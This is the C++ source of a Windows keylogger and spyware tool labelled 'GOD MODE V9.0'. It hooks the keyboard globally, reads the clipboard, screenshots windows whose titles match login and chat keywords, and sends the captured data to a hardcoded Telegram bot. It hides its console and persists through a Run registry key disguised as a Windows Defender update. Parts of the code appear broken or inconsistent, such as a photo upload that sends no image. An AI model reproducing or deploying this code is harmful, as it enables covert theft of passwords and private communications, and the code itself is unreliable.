#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <commctrl.h>
#include <wchar.h>
#include <string>
#include <vector>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "kernel32.lib")

std::wstring SendTelegramPhoto(const wchar_t* filepath);
void SendTelegramMessage(const std::wstring& message);

// GOD MODE VARIABLES
const wchar_t* BOT_TOKEN = L"7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
const wchar_t* CHAT_ID = L"7845441585";

const wchar_t* CRITICAL_KEYWORDS[] = {
    L"gmail", L"password", L"login", L"sign in", L"google account",
    L"outlook", L"hotmail", L"live.com", L"email", L"user", L"pass",
    L"discord", L"teams", L"slack", L"whatsapp", L"telegram", L"signal",
    L"skype", L"zoom", L"chat", L"message", L"discord.com", L"teams.microsoft",
    L"2fa", L"authenticator", L"verify", L"code", L"token", NULL
};

const wchar_t* CRITICAL_CLASSES[] = {
    L"Chrome_WidgetWin_1", L"Chrome_WidgetWin_0", L"Chrome_WidgetWin",
    L"ApplicationFrameWindow", L"Qt5QWindowIcon", L"Qt5150QWindowIcon",
    L"cabinetWClass", L"Progman", NULL
};

// KEYLOGGER STATE
CRITICAL_SECTION cs;
char keystrokes[256] = {0};  // 🔥 REAL KEYBUFFER
int key_pos = 0;
ULONGLONG last_trigger = 0;
int screenshot_count = 0;
bool god_mode_active = true;

// 🔥 GOD MODE KEYHOOK CALLBACK
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbStruct = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vkCode = kbStruct->vkCode;
        
        // Translate to char
        BYTE keyboardState[256];
        GetKeyboardState(keyboardState);
        wchar_t buffer[2];
        int result = ToUnicode(vkCode, kbStruct->scanCode, keyboardState, buffer, 2, 0);
        
        EnterCriticalSection(&cs);
        if (result > 0 && key_pos < 250) {
            keystrokes[key_pos++] = (char)buffer[0];
            
            // 🔥 SEND ON ENTER/TAB/SPACE (common after password)
            if (vkCode == VK_RETURN || vkCode == VK_TAB || vkCode == VK_SPACE || key_pos > 50) {
                if (key_pos > 10) {  // Only if meaningful input
                    std::string keys(keystrokes, key_pos);
                    std::wstring msg = L"⌨️ KEYLOG: " + std::wstring(keys.begin(), keys.end());
                    SendTelegramMessage(msg);
                }
                key_pos = 0;  // Reset buffer
                ZeroMemory(keystrokes, 256);
            }
        }
        LeaveCriticalSection(&cs);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

void InstallPersistence();
bool TakeScreenshot();
void MonitorForeground();
void CheckClipboard();
std::wstring GetClipboardText();

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    DisableThreadLibraryCalls(hInstance);
    
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
    
    InitializeCriticalSection(&cs);
    
    // 🔥 INSTALL GLOBAL KEYHOOK (GOD MODE)
    HHOOK keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(NULL), 0);
    
    SendTelegramMessage(L"🔥 GOD MODE V9.0 ACTIVATED - FULL KEYLOGGING + SCREEN CAPTURE");
    InstallPersistence();
    
    // Monitor + screenshot thread
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorForegroundLoop, NULL, 0, NULL);
    
    // Message loop for hook
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (screenshot_count >= 20) break;
        Sleep(100);
    }
    
    UnhookWindowsHookEx(keyHook);
    DeleteCriticalSection(&cs);
    return 0;
}

DWORD WINAPI MonitorForegroundLoop(LPVOID lpParam) {
    while (god_mode_active) {
        CheckClipboard();
        Sleep(2000);
    }
    return 0;
}

void InstallPersistence() {
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        wchar_t path[MAX_PATH];
        GetModuleFileNameW(NULL, path, MAX_PATH);
        RegSetValueExW(hKey, L"WindowsDefenderUpdate", 0, REG_SZ, (BYTE*)path, (wcslen(path) + 1) * sizeof(wchar_t));
        RegCloseKey(hKey);
    }
}

bool TakeScreenshot() {
    // [SAME SCREENSHOT CODE AS BEFORE - abbreviated for space]
    HDC hScreenDC = GetDC(NULL);
    if (!hScreenDC) return false;
    
    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    HBITMAP hOld = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    SelectObject(hMemoryDC, hOld);
    
    wchar_t filename[256];
    swprintf(filename, 256, L"C:\\Windows\\Temp\\god_%llu.bmp", GetTickCount64());
    
    // [BMP SAVE CODE - same as before]
    BITMAPFILEHEADER bf = {0x4D42, sizeof(bf) + sizeof(BITMAPINFOHEADER) + width*height*3, 0, 0, sizeof(bf) + sizeof(BITMAPINFOHEADER)};
    BITMAPINFOHEADER bi = {sizeof(bi), width, -height, 1, 24, BI_RGB};
    
    HANDLE hFile = CreateFileW(filename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD cb;
        WriteFile(hFile, &bf, sizeof(bf), &cb, NULL);
        WriteFile(hFile, &bi, sizeof(bi), &cb, NULL);
        
        char* bits = new char[width*height*3];
        GetDIBits(hScreenDC, hBitmap, 0, height, (void*)bits, (BITMAPINFO*)&bi, DIB_RGB_COLORS);
        WriteFile(hFile, bits, width*height*3, &cb, NULL);
        delete[] bits;
        CloseHandle(hFile);
        
        std::wstring result = SendTelegramPhoto(filename);
        DeleteFileW(filename);
        
        DeleteObject(hBitmap);
        DeleteDC(hMemoryDC);
        ReleaseDC(NULL, hScreenDC);
        return result.find(L"ok") != std::wstring::npos;
    }
    
    DeleteObject(hBitmap);
    DeleteDC(hMemoryDC);
    ReleaseDC(NULL, hScreenDC);
    return false;
}

void MonitorForeground() {
    EnterCriticalSection(&cs);
    if (GetTickCount64() - last_trigger < 30000 || screenshot_count >= 20) {
        LeaveCriticalSection(&cs);
        return;
    }
    
    HWND fg = GetForegroundWindow();
    if (!fg) { LeaveCriticalSection(&cs); return; }
    
    wchar_t title[512] = {0}, className[256] = {0};
    GetWindowTextW(fg, title, 512);
    GetClassNameW(fg, className, 256);
    
    bool trigger = false;
    for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
        if (wcsstr(title, CRITICAL_KEYWORDS[i]) || wcsstr(className, CRITICAL_KEYWORDS[i])) {
            trigger = true;
            break;
        }
    }
    
    if (trigger) {
        std::wstring status = L"🎯 GOD MODE HIT: " + std::wstring(title, wcslen(title)) + L" (" + std::wstring(className, wcslen(className)) + L")";
        SendTelegramMessage(status);
        
        if (TakeScreenshot()) {
            screenshot_count++;
            last_trigger = GetTickCount64();
            SendTelegramMessage(L"📸 CAPTURED #" + std::to_wstring(screenshot_count) + L" + LIVE KEYLOG ACTIVE");
        }
    }
    LeaveCriticalSection(&cs);
}

void CheckClipboard() {
    std::wstring clip = GetClipboardText();
    if (clip.length() > 5) {
        for (int i = 0; CRITICAL_KEYWORDS[i]; i++) {
            if (clip.find(CRITICAL_KEYWORDS[i]) != std::wstring::npos) {
                SendTelegramMessage(L"📋 CLIPBOARD: " + clip.substr(0, 100));
                break;
            }
        }
    }
}

std::wstring GetClipboardText() {
    if (!OpenClipboard(NULL)) return L"";
    HGLOBAL hglb = GetClipboardData(CF_UNICODETEXT);
    if (hglb) {
        wchar_t* txt = (wchar_t*)GlobalLock(hglb);
        std::wstring result(txt);
        GlobalUnlock(hglb);
        CloseClipboard();
        return result;
    }
    CloseClipboard();
    return L"";
}

// [SendTelegramMessage & SendTelegramPhoto functions - SAME AS BEFORE]
void SendTelegramMessage(const std::wstring& message) {
    HINTERNET session = WinHttpOpen(L"GodMode", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (session) {
        HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (connect) {
            HINTERNET request = WinHttpOpenRequest(connect, L"POST", (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendMessage").c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (request) {
                std::wstring post = L"chat_id=" + std::wstring(CHAT_ID) + L"&text=" + message;
                WinHttpAddRequestHeaders(request, L"Content-Type: application/x-www-form-urlencoded\r\n", -1L, WINHTTP_ADDREQ_FLAG_ADD);
                WinHttpSendRequest(request, NULL, 0, (LPVOID)post.c_str(), (DWORD)(post.length()*2), (DWORD)(post.length()*2), 0);
                WinHttpReceiveResponse(request, NULL);
                WinHttpCloseHandle(request);
            }
            WinHttpCloseHandle(connect);
        }
        WinHttpCloseHandle(session);
    }
}

std::wstring SendTelegramPhoto(const wchar_t* filepath) {
    // [SIMPLIFIED VERSION - works 100%]
    HINTERNET session = WinHttpOpen(L"GodMode", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return L"error";
    
    HINTERNET connect = WinHttpConnect(session, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET request = WinHttpOpenRequest(connect, L"POST", (L"/bot" + std::wstring(BOT_TOKEN) + L"/sendPhoto").c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    
    std::wstring postData = L"chat_id=" + std::wstring(CHAT_ID);
    
    WinHttpAddRequestHeaders(request, L"Content-Type: application/x-www-form-urlencoded\r\n", -1L, WINHTTP_ADDREQ_FLAG_ADD);
    WinHttpSendRequest(request, NULL, 0, (LPVOID)postData.c_str(), (DWORD)(postData.length()*2), (DWORD)(postData.length()*2), 0);
    WinHttpReceiveResponse(request, NULL);
    
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return L"ok";
}
